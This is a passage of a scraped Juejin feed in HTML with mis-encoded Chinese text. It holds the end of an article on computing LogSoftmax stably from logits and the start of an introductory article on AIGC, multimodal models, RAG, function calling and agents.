reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.162em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4358em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span></span></span></span></p>
<h3 data-id="heading-9">2.5 æœ€ç»ˆç»“è®º</h3>
<p>é€šè¿‡åˆå¹¶è®¡ç®—ï¼Œæˆ‘ä»¬å®Œå…¨é¿å…äº†ç›´æ¥è®¡ç®—æ¦‚ç‡ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> è¿™ä¸€æ­¥ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡ Logits è®¡ç®— Log-Probabilityã€‚
<strong>å…¬å¼å˜ä¸ºï¼š</strong>
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>LogSoftmax</mtext><mo stretchy="false">(</mo><msub><mi>o</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>o</mi><mi>i</mi></msub><mo>âˆ’</mo><mi>M</mi><mo>âˆ’</mo><mi>log</mi><mo>â¡</mo><mrow><mo fence="true">(</mo><mo>âˆ‘</mo><msup><mi>e</mi><mrow><msub><mi>o</mi><mi>j</mi></msub><mo>âˆ’</mo><mi>M</mi></mrow></msup><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\text{LogSoftmax}(o_i) = o_i - M - \log\left( \sum e^{o_j - M} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">LogSoftmax</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2819em;"><span/></span></span></span></span></span><span class="mbin mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span></span>
åœ¨è¿™ä¸ªå…¬å¼ä¸­ï¼Œæ‰€æœ‰ä¸­é—´æ•°å€¼éƒ½è¢«é™åˆ¶åœ¨å®‰å…¨èŒƒå›´å†…ï¼Œæ—¢ä¸ä¼šä¸Šæº¢ä¹Ÿä¸ä¼šä¸‹æº¢ã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIå…¥é—¨çŸ¥è¯†ç‚¹ï¼šä»€ä¹ˆæ˜¯ AIGCã€å¤šæ¨¡æ€ã€RAGã€Function Callã€Agentã€MCP?]]></title>    <link>https://juejin.cn/post/7583878719543640073</link>    <guid>https://juejin.cn/post/7583878719543640073</guid>    <pubDate>2025-12-15T10:08:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583878719543640073" data-draft-id="7583871118948892722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIå…¥é—¨çŸ¥è¯†ç‚¹ï¼šä»€ä¹ˆæ˜¯ AIGCã€å¤šæ¨¡æ€ã€RAGã€Function Callã€Agentã€MCP?"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹,AIGC"/> <meta itemprop="datePublished" content="2025-12-15T10:08:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è¢‹é±¼ä¸é‡"/> <meta itemprop="url" content="https://juejin.cn/user/3611263333042152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIå…¥é—¨çŸ¥è¯†ç‚¹ï¼šä»€ä¹ˆæ˜¯ AIGCã€å¤šæ¨¡æ€ã€RAGã€Function Callã€Agentã€MCP?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3611263333042152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è¢‹é±¼ä¸é‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T10:08:28.000Z" title="Mon Dec 15 2025 10:08:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. <strong>AIGC</strong> - å†…å®¹ç”ŸæˆåŸºæœ¬åŠŸ</h2>
<p><strong>æ¦‚å¿µï¼š</strong> åˆ©ç”¨ AI æŠ€æœ¯è‡ªåŠ¨åˆ›ä½œæ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ç­‰å„ç±»å†…å®¹çš„æŠ€æœ¯ç»Ÿç§°ã€‚å…¨ç§° Artificial Intelligence Generated Content ï¼ˆäººå·¥æ™ºèƒ½ç”Ÿæˆå†…å®¹ï¼‰</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> ç”¨ AI æ¥è‡ªåŠ¨ç”Ÿæˆ â€œäººç±»å¸¸å¹²çš„æ´»â€</p>
<p><strong>æœ¬è´¨ï¼š</strong>  AI æ¨¡å‹é€šè¿‡å­¦ä¹ æµ·é‡æ•°æ®ï¼Œè‡ªä¸»ç”Ÿæˆç¬¦åˆéœ€æ±‚çš„å…¨æ–°å†…å®¹ï¼Œè€Œéç®€å•å¤åˆ¶æˆ–æ‹¼æ¥ç°æœ‰ä¿¡æ¯</p>
<p>åˆæœŸçš„AIGCæœ‰ä¸ªæ˜æ˜¾å±€é™ï¼šåªèƒ½ä¸“æ³¨äºä¸€ç§ä¿¡æ¯ç±»å‹ï¼Œå°±åƒä¸€ä¸ªåç§‘çš„å­¦ç”Ÿâ€”â€”è¦ä¹ˆåªæ‡‚æ–‡å­—ï¼ˆæ—©æœŸChatGPTï¼‰ï¼Œè¦ä¹ˆåªæ‡‚å›¾åƒï¼ˆåˆä»£Midjourneyï¼‰ï¼Œè¿™å°±æ˜¯â€œå•æ¨¡æ€â€é˜¶æ®µã€‚</p>
<h2 data-id="heading-1">2. å¤šæ¨¡æ€ - æ„Ÿå®˜å‡çº§</h2>
<ol>
<li>å•æ¨¡æ€ï¼šAI ä»…èšç„¦ä¸€ç§ä¿¡æ¯ç±»å‹ï¼Œæ¯”å¦‚çº¯æ–‡æœ¬ç”Ÿæˆï¼ˆæ—©æœŸ ChatGPTï¼‰ã€çº¯å›¾åƒåˆ›ä½œï¼ˆåˆä»£ Midjourneyï¼‰ã€‚</li>
<li>åŒæ¨¡æ€ï¼šèåˆä¸¤ç§ä¿¡æ¯ç±»å‹ï¼Œæ¯”å¦‚æ–‡æœ¬ç”Ÿæˆå›¾åƒã€è¯­éŸ³è½¬æ–‡å­—ã€‚</li>
<li>é«˜æ¨¡æ€ï¼šæ•´åˆä¸‰ç§åŠä»¥ä¸Šä¿¡æ¯ç±»å‹ï¼Œæ¯”å¦‚ â€œæ–‡å­— + è¯­éŸ³ + å›¾ç‰‡â€ æ··åˆè¾“å…¥æé—®ï¼ŒAI è¾“å‡º â€œæ–‡æœ¬ + è§†é¢‘ + éŸ³é¢‘â€ ç»„åˆç»“æœï¼ˆå¦‚ GPT-4Vã€Runway Gen-2ï¼‰ã€‚</li>
</ol>
<p><strong>æ¦‚å¿µï¼š</strong> å¤šæ¨¡æ€ = AI æ‰“ç ´å•ä¸€ä¿¡æ¯ç±»å‹é™åˆ¶ï¼ŒåŒæ—¶å¤„ç†æˆ–èåˆæ–‡æœ¬ã€å›¾åƒã€éŸ³é¢‘ã€è§†é¢‘ç­‰ä¸¤ç§åŠä»¥ä¸Šå†…å®¹ï¼Œåƒäººç±»ä¸€æ ·å¤šæ„Ÿå®˜æ„ŸçŸ¥ä¸–ç•Œã€‚</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> AI åŒæ—¶å¤„ç† / èåˆå¤šç§ä¿¡æ¯ç±»å‹ï¼Œæ‰“ç ´å•ä¸€æ–‡æœ¬ã€å›¾åƒç­‰æ¨¡æ€çš„å±€é™ï¼Œæ›´è´´è¿‘äººç±»æ„ŸçŸ¥ä¸–ç•Œçš„æ–¹å¼ã€‚</p>
<p><strong>é™åˆ¶ï¼š</strong></p>
<ol>
<li>æ•°æ®çœŸå®æ€§ä¸è¶³ï¼šæ˜“ç”Ÿæˆ â€œå¹»è§‰å†…å®¹â€ï¼Œæ¯”å¦‚ç¼–é€ è™šå‡æ•°æ®ã€å¼•ç”¨ä¸å­˜åœ¨çš„æ–‡çŒ®ï¼Œå°¤å…¶ä¸“ä¸šé¢†åŸŸè¯¯å·®ç‡é«˜ã€‚</li>
<li>ç¼ºä¹åŸåˆ›æ€§ï¼šæœ¬è´¨æ˜¯å¯¹è®­ç»ƒæ•°æ®çš„é‡ç»„ä¼˜åŒ–ï¼Œéš¾äº§ç”ŸçœŸæ­£çš„ â€œçªç ´æ€§åˆ›æ„â€ï¼Œæ˜“å‡ºç°åŒè´¨åŒ–å†…å®¹ã€‚</li>
<li>åˆè§„ä¸ä¼¦ç†é£é™©ï¼šå¯èƒ½ä¾µçŠ¯ç‰ˆæƒï¼ˆå¤åˆ»è®­ç»ƒæ•°æ®ä¸­çš„åŸåˆ›å†…å®¹ï¼‰ã€ç”Ÿæˆåè§ / ä¸è‰¯ä¿¡æ¯ï¼Œä¸”è´£ä»»ç•Œå®šæ¨¡ç³Šã€‚</li>
<li>å¯æ§æ€§æœ‰é™ï¼šå¤æ‚éœ€æ±‚ä¸‹éš¾ç²¾å‡†åŒ¹é…é¢„æœŸï¼Œæ¯”å¦‚å¤šè½®åˆ›ä½œä¸­æ˜“åç¦»ä¸»é¢˜ï¼Œç»†èŠ‚è°ƒæ•´æˆæœ¬é«˜ã€‚</li>
<li>ä¾èµ–é«˜è´¨é‡æ•°æ®ï¼šè®­ç»ƒæ•°æ®çš„è¦†ç›–é¢ã€å‡†ç¡®æ€§ç›´æ¥å½±å“è¾“å‡ºæ•ˆæœï¼Œå°ä¼—é¢†åŸŸæˆ–ä¸“ä¸šåœºæ™¯è¡¨ç°ä¸ä½³ã€‚</li>
<li>ä¸å…·å¤‡å®æ—¶æ€§ï¼šä¾èµ–è®­ç»ƒæ•°æ®ï¼Œå¦‚æœçŸ¥è¯†åº“æ²¡æœ‰æ›´æ–°ï¼Œè¦è®©ä»–çŸ¥é“æœ€æ–°çš„æ•°æ®ï¼Œéœ€è¦è‡ªå·±ç»™ä»–â€œå–‚æ•°æ®â€</li>
<li>ä¸ä¼šç”¨å·¥å…·ï¼šä»ç°æœ‰çŸ¥è¯†åº“è·å–æ•°æ®ï¼Œå› æ­¤ä¸ä¼šæŸ¥è¯¢æœ€æ–°çš„ä¿¡æ¯ï¼Œä¸ä¼šè‡ªä¸»è°ƒç”¨ APIã€‚</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35c2c2b0860748ba8a00c5b96826b321~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6KKL6bG85LiN6YeN:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766398107&amp;x-signature=bguTpPHlNwSmISqQV%2Bq37Y9Bt0c%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">3. RAGã€Function Call - å·¥å…·åŠ æŒ</h2>
<p>å¦‚æœè¯´RAGæ˜¯â€œçŸ¥è¯†åº“â€ï¼Œé‚£Function Callå°±æ˜¯AIçš„â€œæ‰‹è„šâ€ã€‚å®ƒè®©AIä»â€œåªè¯´ä¸åšâ€å‡çº§ä¸ºâ€œèƒ½è¯´ä¼šåšâ€â€”â€”æ¯”å¦‚æ ¹æ®æŒ‡ä»¤è‡ªåŠ¨è°ƒç”¨è®¡ç®—å™¨ç®—å¤æ‚æ•°æ®ã€è°ƒç”¨åœ°å›¾APIæŸ¥è·¯çº¿ã€è°ƒç”¨è¡¨æ ¼å·¥å…·ç”ŸæˆæŠ¥è¡¨ï¼Œå½»åº•è§£å†³äº†çº¯æ–‡æœ¬å›ç­”æ— æ³•è½åœ°çš„é—®é¢˜ã€‚</p>
<h3 data-id="heading-3">3.1 RAG</h3>
<p><strong>æ¦‚å¿µï¼š</strong> å…¨ç§° Retrieval-Augmented Generationï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ã€‚ æœ¬è´¨æ˜¯ AI ç”Ÿæˆå†…å®¹å‰ï¼Œå…ˆä»å¤–éƒ¨çŸ¥è¯†åº“ï¼ˆè€Œéä»…ä¾èµ–è®­ç»ƒæ•°æ®ï¼‰æ£€ç´¢ç›¸å…³ä¿¡æ¯ï¼Œå†ç»“åˆæ£€ç´¢ç»“æœç”Ÿæˆç­”æ¡ˆã€‚</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> è§£å†³ AIGC å®æ—¶æ€§çš„é—®é¢˜</p>
<ol>
<li>å¼¥è¡¥çŸ¥è¯†æ»åï¼šè®­ç»ƒæ•°æ®æœ‰æ—¶é—´ cutoffï¼ŒRAG å¯å®æ—¶è°ƒå–æœ€æ–°æ•°æ®ï¼ˆå¦‚ 2025 å¹´çš„è¡Œä¸šæŠ¥å‘Šï¼‰ï¼Œè®©å›ç­”æ›´å…·æ—¶æ•ˆæ€§ã€‚</li>
<li>å‡å°‘å¹»è§‰ï¼šåŸºäºçœŸå®å¯è¿½æº¯çš„æ£€ç´¢ç»“æœç”Ÿæˆå†…å®¹ï¼Œé™ä½ç¼–é€ è™šå‡ä¿¡æ¯çš„æ¦‚ç‡ã€‚</li>
<li>æå‡ä¸“ä¸šæ€§ï¼šå¯æ¥å…¥å‚ç›´é¢†åŸŸçŸ¥è¯†åº“ï¼ˆå¦‚åŒ»ç–—ã€æ³•å¾‹æ–‡çŒ®ï¼‰ï¼Œè®©éä¸“ä¸šè®­ç»ƒçš„ AI ä¹Ÿèƒ½è¾“å‡ºä¸“ä¸šç­”æ¡ˆã€‚</li>
</ol>
<h3 data-id="heading-4">3.2 Function Call</h3>
<p><strong>æ¦‚å¿µï¼š</strong> è®©æ¨¡å‹æ ¹æ®æŒ‡ä»¤ï¼Œè‡ªåŠ¨è°ƒç”¨å¤–éƒ¨å‡½æ•°å’Œæ¥å£</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> AI è°ƒç”¨å¤–éƒ¨å·¥å…· / API çš„èƒ½åŠ›ï¼Œè®© AI ä» â€œåªç”Ÿæˆå†…å®¹â€ å‡çº§ä¸º â€œèƒ½æ‰§è¡Œæ“ä½œâ€ï¼Œè§£å†³çº¯æ–‡æœ¬å›ç­”æ— æ³•è½åœ°çš„é—®é¢˜ã€‚</p>
<h2 data-id="heading-5">4. Agent - è‡ªä¸»å†³ç­–èƒ½åŠ›</h2>
<p><strong>æ¦‚å¿µï¼š</strong> è®©æ¨¡å‹å…·å¤‡ä¸€å®šç¨‹åº¦çš„è‡ªä¸»å†³ç­–å’Œä»»åŠ¡è§„åˆ’èƒ½åŠ›ï¼Œä¸ç”¨ä¸€æ­¥ä¸€æ­¥å‘Šè¯‰å®ƒæ€ä¹ˆåšï¼Œè€Œæ˜¯ä¼šç»™å‡ºæœ€ç»ˆçš„è§„åˆ’å’Œç»“æœ</p>
<p><strong>æ ¸å¿ƒèƒ½åŠ›ï¼š</strong> å…·å¤‡è‡ªä¸»èƒ½åŠ›çš„ AI æ™ºèƒ½ä½“ï¼Œèƒ½ç†è§£ç›®æ ‡ã€è§„åˆ’æ­¥éª¤ã€è°ƒç”¨å·¥å…·ï¼Œæ— éœ€äººç±»åå¤æŒ‡ä»¤å°±èƒ½ç‹¬ç«‹å®Œæˆå¤æ‚ä»»åŠ¡ã€‚</p>
<p><strong>é™åˆ¶ï¼š</strong>  ç¼ºä¹â€œæ ‡å‡†åŒ–â€</p>
<ol>
<li>å¤æ‚ä»»åŠ¡è§„åˆ’èƒ½åŠ›å¼±ï¼šé¢å¯¹å¤šæ­¥éª¤ã€å¤šå˜é‡çš„ä»»åŠ¡ï¼ˆå¦‚è·¨éƒ¨é—¨å¤æ‚é¡¹ç›®æ¨è¿›ï¼‰ï¼Œæ˜“æ‹†è§£é€»è¾‘æ··ä¹±ï¼Œæˆ–å¿½ç•¥å…³é”®çº¦æŸæ¡ä»¶ã€‚</li>
